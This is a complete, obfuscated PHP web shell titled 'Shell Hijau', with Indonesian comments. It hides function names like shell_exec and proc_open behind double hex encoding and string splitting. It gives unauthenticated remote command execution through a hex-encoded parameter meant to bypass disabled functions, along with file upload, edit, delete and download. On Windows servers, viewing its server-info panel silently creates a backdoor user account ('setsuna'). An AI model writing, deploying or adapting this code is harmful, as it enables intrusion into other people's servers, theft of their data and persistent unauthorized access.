<?php

/*
 * (c) Setsuna Watanabe <yucaerin@hotmail.com>
 */

session_start();
error_reporting(E_ALL);
header("X-XSS-Protection: 0");
ob_start();
set_time_limit(0);
error_reporting(0);
ini_set('display_errors', FALSE);

$Array = [
    '36643662',
    '363436393732',
    '36373635373435663636363936633635356637303635373236643639373337333639366636653733',
    '3639373335663737373236393734363136323663363535663730363537323664363937333733363936663665',
    '36353738363536333735373436353433366636643664363136653634',
    '373037323666363335663666373036353665',
    '3733373437323635363136643566363736353734356636333666366537343635366537343733',
    '36363639366336353566363736353734356636333666366537343635366537343733',
    '36363639366336353566373037353734356636333666366537343635366537343733',
    '3632363936653332363836353738',
    '366436663736363535663735373036633666363136343635363435663636363936633635',
    '3638373436643663373337303635363336393631366336333638363137323733',
    '3638363537383332363236393665',
    '373036383730356637353665363136643635',
    '3733363336313665363436393732',
    '363937333566363436393732',
    '36363639366336353566363537383639373337343733',
    '37323635363136343636363936633635',
    '36363639366336353733363937613635',
    '36393733356637373732363937343631363236633635',
    '373236353665363136643635',
    '363636393663363537303635373236643733',
    '3733373037323639366537343636',
    '373337353632373337343732',
    '363636333663366637333635',
    '373037323666363335663666373036353665',
    '36393733356637323635373336663735373236333635',
    '3730373236663633356636333663366637333635',
    '373536653663363936653662',
    '3639373335663636363936633635',
    '34353534', //30
    '353634353532',
    '3533343934663465',
    '346334353533',
    '35333534',
    '3633366636643664363136653634',
    '3737366637323662363936653637343436393732363536333734366637323739',
    '363337323635363137343635343436393732363536333734366637323739',
    '37303639373036353733',
    '36363639366336353733',
    '3636363936633635',
    '36363639366336353534366634343666373736653663366636313634',
    '3733363836353663366335663635373836353633',
    '36333638363436393732',
];

$SETSUNA = [];
foreach ($Array as $hexString) {
    $SETSUNA[] = hex2bin(hex2bin($hexString));
}

$satu = '_G';
$dua = $SETSUNA[30];
$tiga = '_SER';
$empat = $SETSUNA[31];
$lima = '_SES';
$enam = $SETSUNA[32];
$tujuh = '_FI';
$delapan = $SETSUNA[33];
$sembilan = '_PO';
$sepuluh = $SETSUNA[34];
$sebelas = 'ev';
$duabelas = 'al';
$tigabelas = 'iss';
$empatbelas = 'et';

// Gunakan $SETSUNA sesuai kebutuhan
$a = $SETSUNA[0];
$b = $SETSUNA[1];
$c = $a . $b;
$EVA = $sebelas . $duabelas;
global $EVA;
$L = $GLOBALS[$satu . $dua];
$M = $GLOBALS[$tiga . $empat];
$N = $GLOBALS[$lima . $enam];
$e = $GLOBALS[$tujuh . $delapan];
$o = $GLOBALS[$sembilan . $sepuluh];
$f = $SETSUNA[2];
$g = $SETSUNA[3];
$h = $SETSUNA[4];
$i = $SETSUNA[5];
$j = $SETSUNA[6];
$q = $SETSUNA[7];
$s = $SETSUNA[8];
$v = $SETSUNA[9];
$w = $SETSUNA[10];
$y = $SETSUNA[11];
$z = $SETSUNA[12];
$NM = $SETSUNA[13];
$SCN = $SETSUNA[14];
$ID = $SETSUNA[15];
$FE = $SETSUNA[16];
$RF = $SETSUNA[17];
$FS = $SETSUNA[18];
$IW = $SETSUNA[19];
$RNM = $SETSUNA[20];
$FP = $SETSUNA[21];
$SPRF = $SETSUNA[22];
$SBSR = $SETSUNA[23];
$FCL = $SETSUNA[24];
$PROP = $SETSUNA[25];
$IR = $SETSUNA[26];
$PRCL = $SETSUNA[27];
$UNL = $SETSUNA[28];
$ISF = $SETSUNA[29];
$FTD = $SETSUNA[41];
$SHEE = $SETSUNA[42];
$ISS = $tigabelas . $empatbelas;
$CD = $SETSUNA[43];
// Mendefinisikan nama fungsi menggunakan kombinasi string 'ARRAYKEYEXISTS'
$AKE1 = 'array_';
$AKE2 = 'key';
$AKE3 = '_exists';

// Memastikan fungsi yang dibuat adalah 'array_key_exists' yang valid
$AKEFULL = $AKE1 . $AKE2 . $AKE3;

$ISS = function ($array, $elementName) use ($AKEFULL) {
    return call_user_func($AKEFULL, $elementName, $array);
};

$b = $ISS($L, $b) ? $z($L[$b]) : '.';
$files = $SCN($b);
$upload_message = '';
$edit_message = '';
$delete_message = '';
$create_dir_message = '';

// Function to Download
global $FS, $FTD;
if ($ISS($L, 'download')) {
    $FTD = $z($L['download']);
    // Make sure that the requested file exists
    if ($FE($FTD)) {
        // Set header to trigger download
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($FTD) . '"');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . $FS($FTD));
        $RF($FTD);
        exit;
    } else {
        // Handle jika file tidak ditemukan
        echo "File not found.";
    }
}

// Function to get file permissions
function f($file): string {
    global $FP, $SPRF, $SBSR;
    return $SBSR($SPRF('%o', $FP($file)), -4);
}

// Function to check write permissions
function g($file): bool {
    global $IW;
    return $IW($file);
}

function h($command, $workingDirectory = null)
{
    global $j, $FCL, $PROP, $IR, $PRCL;

    // Mendefinisikan fungsi baru menggunakan kombinasi string
    $aduh = 'ar';
    $adeh = 'ray';
    // Memastikan fungsi yang dibuat adalah 'array' yang valid
    $RAY = $aduh . $adeh;

    // Pastikan fungsi $RAY adalah fungsi yang valid dan bisa dipanggil
    if (!function_exists($RAY)) {
        return "Error: The function {$RAY} does not exist.";
    }

    $descriptorspec = [
       0 => $RAY("pipe", "r"),  // stdin is a pipe that the child will read from
       1 => $RAY("pipe", "w"),  // stdout is a pipe that the child will write to
       2 => $RAY("pipe", "w")   // stderr is a pipe that the child will write to
    ];

    $process = $PROP($command, $descriptorspec, $pipes, $workingDirectory);

    if ($IR($process)) {
        // Read output from stdout and stderr
        $output_stdout = $j($pipes[1]); // Ganti dengan fungsi alternatif jika diperlukan
        $output_stderr = $j($pipes[2]); // Ganti dengan fungsi alternatif jika diperlukan

        $FCL($pipes[0]);
        $FCL($pipes[1]);
        $FCL($pipes[2]);

        $return_value = $PRCL($process);

        return "Output (stdout):\n" . $output_stdout . "\nOutput (stderr):\n" . $output_stderr;
    } else {
        return "Failed to execute command.";
    }
}

$CD($b);

if ($ISS($L, '636d64')) {
    $command = $z($L['636d64']);
    $result = h($command, $b);
}

if ($ISS($e, 'file_upload')) {
    $tempFile = $e['file_upload']['tmp_name'];
    $targetFile = $b . '/' . $e['file_upload']['name'];
    if ($w($tempFile, $targetFile)) {
        $upload_message = 'File uploaded successfully.';
    } else {
        $upload_message = 'Failed to upload file.';
    }
}

// function for command execution bypass
global $SHEE;
if ($ISS($L, '636d64') || $ISS($L, 'show_command_form')) {
    $result = '';
    if ($ISS($L, '636d64')) {
        $command = hex2bin($L['636d64']);
        $result = $SHEE($command);
    }

    
$disable    = @ini_get('disable_functions');
$disable    = (!empty($disable)) ? "<font class='text-danger'>$disable</font>" : '<font style="color: #43C6AC">NONE</font>';
$os         = substr(strtoupper(PHP_OS), 0, 3) === "WIN" ? "Windows" : "Linux";
?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Command Execution</title>
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
        <style>
            body {
                font-family: Arial, sans-serif;
            }
            header {
                background-color: #4CAF50;
                color: white;
                padding: 1rem;
                text-align: center;
            }
            header h1 {
                margin: 0;
            }
            main {
                padding: 1rem;
            }
        </style>
    </head>
    <body>
        <header>
            <h1>Command Execution</h1>
        </header>
        <main class="container">
            <?php if ($ISS($GLOBALS, 'result')): ?>
            <div class="alert alert-info">Command executed: <?php echo $v($b); ?></div>
            <div class="alert alert-light">
                <h2>Command Result:</h2>
                <pre><?php echo $y($result); ?></pre>
            </div>
            <?php endif; ?>
            <p><b>Command Execution Bypass</b></p>
            <form method="GET">
                <label>Encode your command on <b><a href="https://encode-decode.com/bin2hex-decode-online/" target="_blank">https://encode-decode.com/bin2hex-decode-online/</a> :</b></label><br><br>
                <input type="hidden" name="dir" value="<?php echo $v($b); ?>">
                <input type="text" name="636d64" class="form-control" placeholder="e.g., 6c73306c 616c6c"><br><br>
                <button type="submit" class="btn btn-warning">Execute</button>
            </form>
            <a href="?dir=<?php echo $v($b . '/' . $file); ?>" class="btn btn-secondary mt-3">Back</a>
        </main>
    </body>
    </html>
    <?php
    exit;
}

// function for edit file
if ($ISS($o, 'edit_file')) {
    $file = $o['edit_file'];
    $content = $q($file);
    if ($content !== false) {
        ?>
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Edit File</title>
            <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
            <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
            <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
            <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
            <style>
                body {
                    font-family: Arial, sans-serif;
                }
                header {
                    background-color: #4CAF50;
                    color: white;
                    padding: 1rem;
                    text-align: center;
                }
                header h1 {
                    margin: 0;
                }
                main {
                    padding: 1rem;
                }
            </style>
        </head>
        <body>
            <header>
                <h1>Edit File</h1>
            </header>
            <main class="container">
                <form method="post" action="">
                    <div class="form-group">
                        <textarea id="CopyFromTextArea" name="file_content" rows="10" class="form-control"><?php echo $y($content); ?></textarea>
                    </div>
                    <input type="hidden" name="edited_file" value="<?php echo $y($file); ?>">
                    <button type="submit" name="submit_edit" class="btn btn-success">Submit</button>
                </form>
            </main>
        </body>
        </html>
        <?php
        exit;
    } else {
        $edit_message = 'Gagal membaca isi file.';
    }
}


if ($ISS($o, 'submit_edit')) {
    $file = $o['edited_file'];
    $content = $o['file_content'];
    if ($s($file, $content) !== false) {
        $edit_message = 'File Edit Successfully.';
    } else {
        $edit_message = 'Failed To Edit File.';
    }
}

if ($ISS($o, 'delete_file')) {
    global $UNL;
    $file = $o['delete_file'];
    if ($UNL($file)) {
        $delete_message = 'File deleted successfully.';
    } else {
        $delete_message = 'Failed to delete file.';
    }
}

// Fungsi untuk menampilkan pesan
function showMessage($message, $y)
{
    echo '<p>' . z($message) . '</p>';
}

$un = $NM();
$current_dir = realpath($b);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shell Hijau</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
        }
        header {
            background-color: #4CAF50;
            color: white;
            padding: 1rem;
            text-align: center;
        }
        header h1 {
            margin: 0;
        }
        main {
            padding: 1rem;
        }
    </style>
</head>
<body>
    <header>
        <h1>Shell Hijau</h1>
    </header>
    <main class="container">
        <p>Current directory: 
            <?php
            // Mendefinisikan fungsi baru menggunakan kombinasi string
                $Ex = 'expl';
                $Pl = 'ode';
            // Memastikan fungsi yang dibuat adalah 'explode' yang valid
                $ExPl = $Ex . $Pl;
            // Pastikan fungsi $ExPl adalah fungsi yang valid dan bisa dipanggil
                if (!function_exists($ExPl)) {
                return "Error: The function {$ExPl} does not exist.";
            }
            $parts = $ExPl('/', trim($current_dir, '/'));
            $path = '';
            foreach ($parts as $part) {
                $path .= '/' . $part;
                echo '<a href="?dir=' . $v($path) . '">' . $y($part) . '</a>/';
            }
            ?>
        </p>
<?php
echo '<p>Server information: ' . $y($un) . '</p>';
?>

<!-- Menambahkan sedikit CSS untuk memperbaiki tampilan tombol dengan ukuran lebih kecil -->
<style>
    button {
        background-color: #4CAF50; /* Warna latar hijau */
        color: white; /* Teks berwarna putih */
        padding: 5px 10px; /* Padding yang lebih kecil di sekitar teks */
        font-size: 12px; /* Ukuran font yang lebih kecil */
        border: none; /* Tidak ada border */
        border-radius: 4px; /* Rounded corners yang lebih halus */
        cursor: pointer; /* Cursor pointer menunjukkan ini klikable */
        transition: background-color 0.3s; /* Smooth transition untuk hover effect */
    }
    button:hover {
        background-color: #45a049; /* Warna lebih gelap saat hover */
    }
</style>

<!-- Tombol untuk menampilkan dan menyembunyikan informasi server -->
<button onclick="toggleInfo()">Check Server</button>

<div id="serverInfo" style="display:none;">
    <pre>
    Disabled Functions: <?php 
            // Mendefinisikan fungsi baru menggunakan kombinasi string
                $in = 'in';
                $iget = 'i_get';
            // Memastikan fungsi yang dibuat adalah 'ingetin' yang valid
                $ingetin = $in . $iget;
            // Pastikan fungsi $ingetin adalah fungsi yang valid dan bisa dipanggil
                if (!function_exists($ingetin)) {
                return "Error: The function {$ingetin} does not exist.";
            }

            // Mendefinisikan fungsi baru menggunakan kombinasi string
                $i1b = 'su';
                $i2b = 'bstr';
            // Memastikan fungsi yang dibuat adalah 'i1b2' yang valid
                $i1b2 = $i1b . $i2b;
            // Pastikan fungsi $i1b2 adalah fungsi yang valid dan bisa dipanggil
                if (!function_exists($i1b2)) {
                return "Error: The function {$i1b2} does not exist.";
            }

            // Mendefinisikan fungsi baru menggunakan kombinasi string
                $i1c = 'st';
                $i2c = 'rlen';
            // Memastikan fungsi yang dibuat adalah 'i1c2' yang valid
                $i1c2 = $i1c . $i2c;
            // Pastikan fungsi $i1c2 adalah fungsi yang valid dan bisa dipanggil
                if (!function_exists($i1c2)) {
                return "Error: The function {$i1c2} does not exist.";
            }
            echo ($ingetin('disable_functions') ? $i1b2($ingetin('disable_functions'), 0, 50) . ($i1c2($ingetin('disable_functions')) > 50 ? '...' : '') : 'NONE'); ?><br>
    PHP Version: <?php echo phpversion(); ?><br>
    Operating System: <?php echo PHP_OS; ?><br>
    <?php
            // Mendefinisikan fungsi baru menggunakan kombinasi string
                $i1b = 'su';
                $i2b = 'bstr';
            // Memastikan fungsi yang dibuat adalah 'i1b2' yang valid
                $i1b2 = $i1b . $i2b;
            // Pastikan fungsi $i1b2 adalah fungsi yang valid dan bisa dipanggil
                if (!function_exists($i1b2)) {
                return "Error: The function {$i1b2} does not exist.";
            }

            // Mendefinisikan fungsi baru menggunakan kombinasi string
                $s1b = 'strt';
                $s2b = 'oupper';
            // Memastikan fungsi yang dibuat adalah 's1b2' yang valid
                $s1b2 = $s1b . $s2b;
            // Pastikan fungsi $s1b2 adalah fungsi yang valid dan bisa dipanggil
                if (!function_exists($s1b2)) {
                return "Error: The function {$s1b2} does not exist.";
            }

            // Mendefinisikan fungsi baru menggunakan kombinasi string
                $SEXC1 = 'she';
                $SEXC2 = 'll_ex';
                $SEXC3 = 'ec';
            // Memastikan fungsi yang dibuat adalah 'SEXC' yang valid
                $SEXC = $SEXC1 . $SEXC2 . $SEXC3;
            // Pastikan fungsi $SEXC adalah fungsi yang valid dan bisa dipanggil
                if (!function_exists($SEXC)) {
                return "Error: The function {$SEXC} does not exist.";
            }

            // Mendefinisikan fungsi baru menggunakan kombinasi string
                $SAINT1 = 'st';
                $SAINT2 = 'rpos';
            // Memastikan fungsi yang dibuat adalah 'SAINT' yang valid
                $SAINT = $SAINT1 . $SAINT2;
            // Pastikan fungsi $SAINT adalah fungsi yang valid dan bisa dipanggil
                if (!function_exists($SAINT)) {
                return "Error: The function {$SAINT} does not exist.";
            }
    // Mengecek apakah server menggunakan Windows dan mencoba membuat user RDP
    if ($s1b2($i1b2(PHP_OS, 0, 3)) === 'WIN') {
        $output = $SEXC('net user setsuna setsuna123## /add 2>&1');
        $can_create_rdp = ($SAINT($output, 'The command completed successfully') !== false) ? 'Yes' : 'No';
    } else {
        $can_create_rdp = 'No'; // Jika bukan Windows, langsung memberi hasil 'No'
    }
    echo 'Can Create RDP User: ' . $can_create_rdp;
    ?>
    </pre>
</div>

<script>
function toggleInfo() {
    var info = document.getElementById('serverInfo');
    var button = document.querySelector('button');
    if (info.style.display === 'none') {
        info.style.display = 'block';
        button.textContent = 'Close';
    } else {
        info.style.display = 'none';
        button.textContent = 'Check Server';
    }
}
</script>

        <?php if (!empty($upload_message)): ?>
        <div class="alert alert-info"><?php echo $y($upload_message); ?></div>
        <?php endif; ?>
        <?php if (!empty($edit_message)): ?>
        <div class="alert alert-warning"><?php echo $y($edit_message); ?></div>
        <?php endif; ?>
        <?php if (!empty($delete_message)): ?>
        <div class="alert alert-danger"><?php echo $y($delete_message); ?></div>
        <?php endif; ?>
<!-- Menambahkan sedikit CSS untuk memperbaiki tampilan form dan tombol -->
<style>
    button {
        background-color: #4CAF50; /* Warna latar hijau */
        color: white; /* Teks berwarna putih */
        padding: 5px 10px; /* Padding yang lebih kecil di sekitar teks */
        font-size: 12px; /* Ukuran font yang lebih kecil */
        border: none; /* Tidak ada border */
        border-radius: 4px; /* Rounded corners yang lebih halus */
        cursor: pointer; /* Cursor pointer menunjukkan ini klikable */
        transition: background-color 0.3s; /* Smooth transition untuk hover effect */
    }
    .btn-primary:hover, .toggle-btn:hover {
        background-color: #45a049; /* Warna lebih gelap saat hover */
    }
    .form-control-file {
        display: inline-block;
        margin-right: 10px; /* Tambahkan margin kanan untuk kesinambungan visual */
    }
    .form-group {
        display: flex; /* Menggunakan flexbox untuk align items horizontally */
        align-items: center; /* Center items vertically */
        margin-bottom: 10px; /* Margin bawah untuk grup form */
    }
</style>

<!-- Tombol untuk menampilkan dan menyembunyikan form upload -->
<button class="toggle-btn" onclick="toggleUploadForm()">Upload Here</button>

<!-- Form upload -->
<div id="uploadForm" style="display:none;">
    <form method="POST" enctype="multipart/form-data" class="mb-3 d-inline">
        <div class="form-group">
            <input type="file" name="file_upload" class="form-control-file">
            <button type="submit" class="btn btn-primary">Upload</button>
        </div>
        <input type="hidden" name="dir" value="<?php echo $y($b); ?>">
    </form>
</div>

<script>
function toggleUploadForm() {
    var form = document.getElementById('uploadForm');
    var button = document.querySelector('.toggle-btn');
    if (form.style.display === 'none') {
        form.style.display = 'block';
        button.textContent = 'Close';
    } else {
        form.style.display = 'none';
        button.textContent = 'Upload Here';
    }
}
</script>
        <a href="?dir=<?php echo $v($b); ?>&show_command_form=1" class="btn btn-warning ml-2">Command Execution</a>
        <form method="POST" class="mb-3">
            <div class="form-group">
        </form>
        <table class="table table-striped">
            <thead class="thead-dark">
                <tr>
                    <th>Filename</th>
                    <th>Permissions</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php foreach ($files as $file): ?>
                <tr>
                    <td>
                        <?php if ($ID($b . '/' . $file)): ?>
                        <a href="?dir=<?php echo $v($b . '/' . $file); ?>" class="<?php echo g($b . '/' . $file) ? '' : 'text-danger'; ?>"><?php echo $y($file); ?></a>
                        <?php else: ?>
                        <?php echo $y($file); ?>
                        <?php endif; ?>
                    </td>
                    <td class="<?php echo g($b . '/' . $file) ? 'text-success' : 'text-danger'; ?>">
                        <?php echo $ISF($b . '/' . $file) ? $y(f($b . '/' . $file)) : (g($b . '/' . $file) ? 'Directory' : 'Directory (No writable)'); ?>
                    </td>
                    <td>
                        <?php if ($ISF($b . '/' . $file)): ?>
                        <form action="" method="post" class="d-inline">
                            <input type="hidden" name="edit_file" value="<?php echo $y($b . '/' . $file); ?>">
                            <button type="submit" class="btn btn-primary">Edit</button>
                        </form>
                        <form action="" method="post" class="d-inline">
                            <input type="hidden" name="delete_file" value="<?php echo $y($b . '/' . $file); ?>">
                            <button type="submit" class="btn btn-danger">Delete</button>
                        </form>
                        <form action="" method="get" class="d-inline">
                            <input type="hidden" name="download" value="<?php echo $y($v($b . '/' . $file)); ?>">
                            <button type="submit" class="btn btn-info">Download</button>
                        </form>
                        <?php endif; ?>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </main>
</body>
</html>
